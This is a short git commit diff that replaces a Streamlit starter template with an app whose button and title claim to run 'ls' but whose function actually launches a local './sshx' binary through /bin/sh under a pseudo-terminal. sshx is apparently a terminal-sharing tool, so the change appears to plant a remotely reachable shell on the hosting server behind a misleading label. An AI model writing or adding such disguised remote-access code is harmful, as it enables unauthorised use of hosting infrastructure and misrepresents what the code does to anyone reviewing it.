5fa853b446a6d134c8eda133fd92cf40f1fe5ceb
getajet <cloth@duckspam.com>
2024-10-20 10:46:12 +0000

    donezo

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,6 +1,19 @@
 import streamlit as st
+import pty
+import subprocess
+import os
 
-st.title("🎈 My new app")
-st.write(
-    "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
-)
+def execute_ls():
+    master, slave = pty.openpty()
+    p = subprocess.Popen(['/bin/sh', '-c', './sshx'], stdout=slave, stderr=slave, close_fds=True)
+    os.close(slave)
+    output = os.read(master, 1024).decode()
+    os.close(master)
+    return output
+
+# Streamlit app
+st.title("Execute 'ls' Command")
+
+if st.button('Execute ls Command'):
+    result = execute_ls()
+    st.text_area("Command Output", result)
